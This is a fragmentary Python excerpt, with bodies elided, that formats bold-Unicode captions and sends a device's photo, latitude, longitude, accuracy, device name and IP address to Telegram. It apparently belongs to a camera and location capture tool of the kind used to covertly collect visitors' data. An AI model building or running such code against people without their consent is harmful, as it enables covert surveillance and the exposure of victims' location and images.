...
# ─── CONVERT TO BOLD UNICODE (Matches HTML font) ───────────────
def to_bold_unicode(text):
    """Convert text to bold Unicode characters (matches HTML style)"""
    result = []
    for char in text:
        code = ord(char)
        if 65 <= code <= 90:  # A-Z
...
def send_photo_to_telegram(image_bytes, device_name, ip_address):
    try:
        ...
        # Professional caption with bold Unicode
...
🌍 𝐋𝐚𝐭𝐢𝐭𝐮𝐝𝐞: {lat}
🌍 𝐋𝐨𝐧𝐠𝐢𝐭𝐮𝐝𝐞: {lon}
🎯 𝐀𝐜𝐜𝐮𝐫𝐚𝐜𝐲: ~{location.get('accuracy', 'Unknown')}m
...
def upload_location():
    try:
        ...
        # Store accuracy for caption
        global current_location
        current_location = location
        
        device_name, ip_address = get_device_info()
        success = send_location_to_telegram(lat, lon, device_name, ip_address)
...
# Global variable for location accuracy
current_location = {}
